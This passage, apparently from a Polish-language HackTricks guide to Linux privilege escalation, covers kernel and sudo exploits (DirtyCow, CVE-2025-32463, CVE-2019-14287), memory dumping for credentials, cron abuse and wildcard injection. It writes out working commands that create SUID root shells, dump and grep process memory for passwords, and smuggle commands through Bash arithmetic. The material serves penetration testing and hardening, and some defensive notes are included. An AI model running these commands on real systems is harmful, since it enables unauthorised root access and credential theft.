# Eskalacja uprawnień w systemie Linux

{{#include ../../../banners/hacktricks-training.md}}

Aby uzyskać szerszy kontekst i poznać historyczne procedury enumeracji, zapoznaj się z materiałami g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation i linux-private-i wymienionymi w sekcji References.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy od zebrania podstawowych informacji o uruchomionym systemie operacyjnym.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Ścieżka

Jeśli **masz uprawnienia do zapisu w dowolnym folderze znajdującym się w zmiennej `PATH`**, możesz przejąć niektóre biblioteki lub pliki binarne:

```bash
echo $PATH
```

### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub API keys?

```bash
(env || set) 2>/dev/null
```

### Exploity jądra

Sprawdź wersję jądra i ustal, czy istnieje exploit, którego można użyć do eskalacji uprawnień.

Sekcja [Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) zawiera przykłady lokalnej eskalacji uprawnień oraz linki do bardziej szczegółowych opracowań dotyczących jądra Linuksa w sekcji Binary Exploitation. Przed przetestowaniem danego przypadku sprawdź, czy dotyczy on używanej kompilacji i konfiguracji.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Możesz znaleźć dobrą listę podatnych jąder oraz kilka już **skompilowanych exploitów** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Inne strony, na których możesz znaleźć **skompilowane exploity**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić z tej strony wszystkie podatne wersje jądra, możesz wykonać:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Narzędzia, które mogą pomóc w wyszukiwaniu exploitów na kernel, to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchom na maszynie ofiary, sprawdza tylko exploity dla kernela 2.x)

Zawsze **wyszukaj wersję kernela w Google** — być może jest ona wymieniona w opisie jakiegoś exploita na kernel, dzięki czemu upewnisz się, że exploit jest odpowiedni.

Dodatkowe techniki wykorzystujące kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Eskalacja uprawnień w Linuksie — kernel Linux <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Wersja sudo

Na podstawie podatnych wersji sudo, które występują w:

```bash
searchsploit sudo
```

Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 through 1.9.17** pozwala nieuprzywilejowanym użytkownikom lokalnym eskalować uprawnienia do roota za pomocą opcji `--chroot`, gdy sudo ładuje `/etc/nsswitch.conf` z katalogu kontrolowanego przez użytkownika; upstream naprawił ten problem w **1.9.17p1**. Sprawdź wszystkie pliki binarne sudo z ustawionym bitem setuid roota w odpowiednich ścieżkach, ponieważ `sudo -V` wyświetla informacje tylko o pliku binarnym wybranym przez `PATH`. Pakiety dystrybucyjne mogą zawierać backport poprawki bez zmiany ciągu wersji upstream, dlatego sprawdź również status pakietu dostawcy. Zobacz [ostrzeżenie opiekuna sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Oto [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) do wykorzystania tej [luki](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Przed uruchomieniem exploita upewnij się, że Twoja wersja `sudo` jest podatna i obsługuje funkcję `chroot`.

Więcej informacji znajdziesz w oryginalnym [ostrzeżeniu o luce](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Ominięcie reguł sudo opartych na hoście (CVE-2025-32462)

Upstream sudo **1.8.8 through 1.9.17** może sprawdzać reguły sudoers oparte na hoście, używając **nazwy hosta podanej przez użytkownika** w `sudo -h <host>` zamiast **rzeczywistej nazwy hosta**; upstream naprawił ten problem w **1.9.17p1**. Użytkownik nadal musi mieć pasujący wpis sudoers dla wybranego hosta. Sprawdź również backporty dostawcy i alternatywne pliki binarne sudo, a także lokalne zasady. Zobacz [ostrzeżenie opiekuna sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Wymagania:
- Podatna wersja sudo
- Reguły sudoers dotyczące konkretnego hosta (host nie jest ani bieżącą nazwą hosta, ani `ALL`)

Przykładowy wzorzec sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Wykorzystanie podatności przez podszycie się pod dozwolony host:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Jeśli rozwiązanie wybranej nazwy jest blokowane, sprawdź, jak ta nazwa jest rozwiązywana na hoście. Sama obecność nazwy w logu lub pliku konfiguracyjnym nie oznacza, że można ją rozwiązać, a modyfikacja `/etc/hosts` zwykle wymaga uprzywilejowanego dostępu do zapisu.

#### sudo < v1.8.28

Ten [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) wymaga aktywnej reguły sudo, która zezwala na uruchomienie polecenia jako użytkownik `ALL`, z wyłączeniem roota, na przykład `(ALL, !root) /bin/bash`. Wywołujący musi również mieć prawo do korzystania z tej reguły, w tym spełniać wszelkie wymagania uwierzytelniania. Sprawdź komunikat bezpieczeństwa dotyczący zainstalowanego pakietu: dostawcy przenieśli poprawkę do wydań, których wyświetlana wersja upstream nadal jest niższa niż 1.8.28. Sama reguła `!root` lub stara wersja nie potwierdza podatności. Podczas pasywnego rozpoznania nie testuj uprzywilejowanego polecenia.

```
sudo -u#-1 /bin/bash
```

### Weryfikacja podpisu dmesg nie powiodła się

Sprawdź **box smasher2 z HTB** jako **przykład** tego, jak można wykorzystać tę lukę.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Dalsza enumeracja systemu

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Wylicz możliwe mechanizmy obronne

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Jeśli znajdujesz się wewnątrz kontenera, zacznij od poniższej sekcji dotyczącej bezpieczeństwa kontenerów, a następnie przejdź do stron poświęconych nadużyciom specyficznym dla danego środowiska uruchomieniowego:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Dyski

Sprawdź, **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy nie zawiera prywatnych informacji.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Przydatne oprogramowanie

Wylistuj przydatne pliki binarne

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Sprawdź również, czy **jest zainstalowany jakikolwiek kompilator**. Przyda się to, jeśli trzeba użyć exploita kernela, ponieważ zaleca się skompilowanie go na maszynie, na której zamierzasz go użyć (lub na podobnej).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Zainstalowane podatne oprogramowanie

Sprawdź **wersje zainstalowanych pakietów i usług**. Być może zainstalowano starą wersję Nagiosa (na przykład), którą można wykorzystać do eskalacji uprawnień…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Jeśli masz dostęp SSH do maszyny, możesz też użyć **openVAS**, aby sprawdzić, czy zainstalowane na niej oprogramowanie jest nieaktualne lub podatne na ataki.

> [!NOTE] > _Pamiętaj, że te polecenia wyświetlą wiele informacji, z których większość będzie bezużyteczna. Dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy którakolwiek z zainstalowanych wersji oprogramowania jest podatna na znane exploity._

## Procesy

Sprawdź, **jakie procesy** są uruchomione, i zweryfikuj, czy któryś z nich ma **większe uprawnienia, niż powinien** (może Tomcat jest uruchomiony przez roota?).

```bash
ps aux
ps -ef
top -n 1
```

Zawsze sprawdzaj, czy nie działają [**debuggery electron/cef/chromium** — możesz je wykorzystać do eskalacji uprawnień](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w wierszu poleceń procesu.\
**Sprawdź też swoje uprawnienia do plików binarnych procesów** — może uda Ci się nadpisać któryś z nich.

### Łańcuchy procesów rodzic–dziecko między użytkownikami

Proces potomny działający jako **inny użytkownik** niż jego proces nadrzędny nie jest automatycznie oznaką złośliwego działania, ale stanowi przydatny **sygnał do dalszej analizy**. Niektóre zmiany użytkownika są spodziewane (`root` uruchamiający konto usługi, menedżery logowania tworzące procesy sesji), ale nietypowe łańcuchy mogą ujawnić wrappery, pomocniki debugowania, mechanizmy persistence lub słabe granice zaufania środowiska uruchomieniowego.

Szybki przegląd:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Jeśli znajdziesz zaskakujący łańcuch, sprawdź wiersz poleceń procesu nadrzędnego oraz wszystkie pliki wpływające na jego działanie (`config`, `EnvironmentFile`, skrypty pomocnicze, katalog roboczy, zapisywalne argumenty). W kilku rzeczywistych ścieżkach eskalacji uprawnień plik procesu potomnego nie był zapisywalny, ale **konfiguracja kontrolowana przez proces nadrzędny** lub łańcuch skryptów pomocniczych już tak.

### Usunięte pliki wykonywalne i usunięte, wciąż otwarte pliki

Artefakty środowiska uruchomieniowego są często nadal dostępne **po usunięciu**. Przydaje się to zarówno do eskalacji uprawnień, jak i do odzyskiwania dowodów z procesu, który ma już otwarte poufne pliki.

Sprawdź, czy usunięto pliki wykonywalne:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Jeśli `/proc/<PID>/exe` wskazuje na `(deleted)`, proces nadal korzysta ze starego obrazu binarnego z pamięci. To ważny sygnał, który warto zbadać, ponieważ:

- usunięty plik wykonywalny może zawierać interesujące ciągi znaków lub dane uwierzytelniające
- działający proces może nadal udostępniać przydatne deskryptory plików
- usunięty plik binarny z uprawnieniami może wskazywać na niedawne manipulacje lub próbę zatarcia śladów

Zbierz globalnie listę otwartych, usuniętych plików:

```bash
lsof +L1
```

Jeśli znajdziesz interesujący deskryptor, odzyskaj go bezpośrednio:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Jest to szczególnie przydatne, gdy proces wciąż ma otwarty usunięty sekret, skrypt, eksport bazy danych lub plik z flagą.

### Monitorowanie procesów

Do monitorowania procesów możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy). Może to być bardzo przydatne przy identyfikowaniu podatnych procesów, które są uruchamiane często lub po spełnieniu określonych wymagań.

#### Linux ProcMon przez sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) może śledzić wybrane procesy i wywołania systemowe oraz zapisywać ślad w bazie SQLite. Jeśli `sudo -l` zezwala na nieograniczone uruchamianie polecenia `procmon` z uprawnieniami roota, zastanów się, czy mogłoby ono obserwować dane wejściowe lub wyjściowe procesu innego użytkownika. To uprawnienie jest jedynie wskazówką do dalszej weryfikacji: znaczenie mają obsługa przez tracer, obowiązujące zasady i aktywność odpowiedniego procesu. Pliki śladów mogą zawierać sekrety, dlatego dokładnie sprawdzaj autoryzowane eksporty i unikaj zbierania danych z niepowiązanych procesów.

### Pamięć procesu

Niektóre usługi serwera zapisują **poświadczenia jawnym tekstem w pamięci**.\
Zwykle do odczytania pamięci procesów należących do innych użytkowników potrzebujesz **uprawnień roota**, dlatego jest to zazwyczaj przydatniejsze, gdy masz już roota i chcesz znaleźć więcej poświadczeń.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz odczytać pamięć procesów, które należą do Ciebie**.

> [!WARNING]
> Pamiętaj, że obecnie większość maszyn **domyślnie nie zezwala na ptrace**, co oznacza, że nie możesz zrzucać pamięci innych procesów należących do nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: można debugować wszystkie procesy, o ile mają ten sam uid. Tak działało ptracing w klasycznym modelu.
> - **kernel.yama.ptrace_scope = 1**: można debugować tylko proces nadrzędny.
> - **kernel.yama.ptrace_scope = 2**: tylko administrator może używać ptrace, ponieważ wymaga to uprawnienia CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: nie można śledzić żadnych procesów za pomocą ptrace. Po ustawieniu tej wartości ponowne uruchomienie systemu jest konieczne, aby ponownie włączyć ptracing.

Proces z tym samym UID, który na krótko odblokowuje sejf z hasłami, może stanowić odrębną granicę bezpieczeństwa poświadczeń. Gdy śledzenie jest dozwolone, aktywny proces, którego pamięć można zrzucić, może ujawnić hasło do sejfu za pośrednictwem wywołań systemowych obsługujących dane wejściowe lub swojej pamięci, mimo że sam zaszyfrowany plik sejfu pozostaje chroniony. `ptrace_scope=0` jest tylko jednym z warunków wstępnych: znaczenie mają też zgodność poświadczeń, możliwość zrzutu pamięci procesu, inne moduły bezpieczeństwa Linuksa oraz czas działania procesu. Wykorzystanie wpisu z sejfu jako danych logowania roota w systemie Unix wymaga osobnego sprawdzenia ponownego użycia poświadczeń. Rutynowa enumeracja powinna wskazywać zasady oraz potencjalne procesy lub ścieżki do sejfów, a nie przechwytywać dane wejściowe ani wyświetlać sekretów. Zobacz [dokumentację Yama w jądrze](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) oraz [kontrole dostępu ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz pobrać Heap i przeszukać go w poszukiwaniu jej poświadczeń.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Skrypt GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu **maps pokazuje, jak pamięć jest mapowana w wirtualnej przestrzeni adresowej tego procesu**; pokazuje również **uprawnienia każdego zmapowanego obszaru**. Pseudoplik **mem udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **obszary pamięci można odczytać** i jakie są ich przesunięcia. Korzystamy z tych informacji, aby **przejść do odpowiednich miejsc w pliku mem i zrzucić wszystkie obszary możliwe do odczytu** do pliku.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` zapewnia dostęp do **pamięci fizycznej** systemu, a nie do pamięci wirtualnej. Do przestrzeni adresowej wirtualnej jądra można uzyskać dostęp za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` jest dostępny tylko do odczytu dla **roota** i grupy **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump dla systemu Linux

ProcDump to linuxowa odsłona klasycznego narzędzia ProcDump z pakietu Sysinternals dla systemu Windows. Pobierz je ze strony [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Narzędzia

Do zrzucenia pamięci procesu możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymóg root i zrzucić proces należący do Ciebie
- Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany root)

### Dane uwierzytelniające z pamięci procesu

#### Przykład ręczny

Jeśli znajdziesz działający proces uwierzytelniający:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Możesz zrzucić proces (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby zrzucania pamięci procesu) i wyszukać dane uwierzytelniające w pamięci:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **wykrada dane uwierzytelniające w postaci jawnego tekstu z pamięci** oraz niektórych **znanych plików**. Do prawidłowego działania wymaga uprawnień roota.

| Funkcja                                           | Nazwa procesu       |
| ------------------------------------------------- | ------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)           | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (aktywne sesje SSH — użycie Sudo)         | sshd:                |

#### Wyrażenia regularne do wyszukiwania/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Zaplanowane zadania/Cron

### Crontab UI (alseambusher) uruchomiony jako root – eskalacja uprawnień przez scheduler dostępny przez przeglądarkę

Jeśli panel webowy „Crontab UI” (alseambusher/crontab-ui) działa jako root i jest powiązany tylko z loopbackiem, nadal możesz uzyskać do niego dostęp przez SSH local port-forwarding i utworzyć uprzywilejowane zadanie, aby podnieść uprawnienia.<sup>[[1]](#references)[[4]](#references)</sup>

Typowy łańcuch
- Znajdź port dostępny tylko przez loopback (np. 127.0.0.1:8000) i realm Basic-Auth za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź dane logowania w artefaktach operacyjnych:
  - Kopie zapasowe/skrypty z `zip -P <password>`
  - Jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Utwórz tunel i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie z wysokimi uprawnieniami i uruchom je natychmiast (tworzy powłokę SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```

Utwardzanie zabezpieczeń
- Nie uruchamiaj Crontab UI jako root; użyj dedykowanego użytkownika i ogranicz uprawnienia do minimum
- Powiąż usługę z localhost i dodatkowo ogranicz dostęp za pomocą firewall/VPN; nie używaj ponownie haseł
- Unikaj umieszczania sekretów w plikach jednostek; używaj magazynów sekretów lub pliku EnvironmentFile dostępnego tylko dla root
- Włącz audytowanie/logowanie wykonywania zadań na żądanie

Sprawdź, czy któreś zaplanowane zadanie jest podatne na atak. Może uda ci się wykorzystać skrypt uruchamiany przez root (podatność z wildcardami? Możesz modyfikować pliki używane przez root? Użyć symlinków? Utworzyć konkretne pliki w katalogu używanym przez root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Jeśli używane jest `run-parts`, sprawdź, które nazwy zostaną faktycznie wykonane:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

This pozwala uniknąć fałszywych alarmów. Katalog okresowy z prawami zapisu jest przydatny tylko wtedy, gdy nazwa pliku payloadu jest zgodna z lokalnymi regułami `run-parts`.

### Ścieżka Cron

Na przykład w pliku _/etc/crontab_ można znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik „user” ma prawa zapisu do /home/user_)

Jeśli w tym crontabie użytkownik root spróbuje wykonać jakieś polecenie lub skrypt bez ustawiania ścieżki, na przykład: _\* \* \* \* root overwrite.sh_\
możesz uzyskać powłokę roota, używając:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron using a script with a wildcard (Wildcard Injection)

Jeśli skrypt uruchamiany przez root zawiera „**\***” wewnątrz polecenia, możesz to wykorzystać, aby wywołać nieoczekiwane skutki (np. privesc). Przykład:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Jeśli przed wildcardem znajduje się ścieżka, np.** _**/some/path/\***_ **, nie jest on podatny na ataki (dotyczy to nawet** _**./\***_ **).**

Przeczytaj poniższą stronę, aby poznać więcej sztuczek związanych z wykorzystaniem wildcardów:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Wstrzyknięcie w rozwinięciu arytmetycznym Bash w parserach logów cron

Bash może interpretować niezaufany tekst jako wyrażenie arytmetyczne. W niektórych kontekstach Bash indeks tablicy wewnątrz takiego wyrażenia może spowodować wykonanie podstawienia polecenia. Jeśli uprzywilejowany parser cron umieści kontrolowany przez atakującego tekst z logu w takim porównaniu arytmetycznym, podstawienie może zostać wykonane z uprawnieniami parsera.<sup>[[22]](#references)</sup> Zależy to od dokładnego wyrażenia Bash i jego wersji; sam ciąg `$(...)0` w rozwiniętej zmiennej nie stanowi wiarygodnej demonstracji ponownej ewaluacji.

Dane wejściowe mogą też pochodzić z metadanych pliku lub innego pola odczytywanego z lokalizacji zapisywalnej przez użytkownika. Na przykład uprzywilejowany skrypt czyszczący, który odczytuje tag `Producer` obrazu i porównuje go za pomocą `[[ "$producer" -eq "expected" ]]`, wykonuje porównanie arytmetyczne, mimo że zmienna jest ujęta w cudzysłów. Sprawdź, z jaką tożsamością uruchamiane jest zadanie, które pliki mogą dostarczyć tag, jakie przekształcenia są wykonywane przed porównaniem oraz jakie jest dokładne zachowanie Bash. W przypadku etykiet tekstowych używaj porównania ciągów znaków; w przypadku liczb przed wykonaniem działań arytmetycznych sprawdź, czy dane wejściowe składają się wyłącznie z cyfr dziesiętnych. Zobacz [zasady arytmetyki Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Typowy podatny wzorzec:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Bezpieczna lokalna sonda zachowania mechanizmu indeksowania tablicy (bez procesu uprzywilejowanego ani modyfikacji plików):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Prześledź rzeczywisty zaplanowany skrypt i dosłowną ścieżkę wejściową, którą otwiera. Nawet jeśli sam plik dziennika nie jest zapisywalny, użytkownik, który może zapisywać w jego katalogu nadrzędnym bez sticky bitu i przechodzić przez niego, może być w stanie podmienić wpis katalogowy; `namei -l` pomaga rozróżnić te uprawnienia. Inna zapisywalna ścieżka dziennika, nieczytelny scheduler lub parser, który nigdy nie interpretuje tego pola jako wyrażenia arytmetycznego Bash, nie potwierdzają tej ścieżki.

### Nadpisywanie skryptu Cron i symlink

Jeśli **możesz modyfikować skrypt Cron** uruchamiany przez roota, możesz bardzo łatwo uzyskać shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Jeśli skrypt uruchamiany przez root korzysta z **katalogu, do którego masz pełny dostęp**, być może warto usunąć ten katalog i **utworzyć dowiązanie symboliczne do innego katalogu**, który udostępnia kontrolowany przez Ciebie skrypt.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Walidacja dowiązań symbolicznych i bezpieczniejsza obsługa plików

Podczas sprawdzania uprzywilejowanych skryptów/binarnych plików, które odczytują lub zapisują pliki po ścieżce, sprawdź, jak obsługiwane są dowiązania:

- `stat()` podąża za dowiązaniem symbolicznym i zwraca metadane celu.
- `lstat()` zwraca metadane samego dowiązania.
- `readlink -f` i `namei -l` pomagają ustalić ostateczny cel i pokazują uprawnienia każdego elementu ścieżki.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Dla obrońców i deweloperów bezpieczniejsze wzorce zapobiegające sztuczkom z symlinkami obejmują:

- `O_EXCL` z `O_CREAT`: przerwij, jeśli ścieżka już istnieje (blokuje wcześniej utworzone przez atakującego linki/pliki).
- `openat()`: działaj względem deskryptora pliku zaufanego katalogu.
- `mkstemp()`: twórz pliki tymczasowe atomowo, z bezpiecznymi uprawnieniami.

### Niestandardowe, podpisane pliki binarne cron z zapisywalnymi payloadami
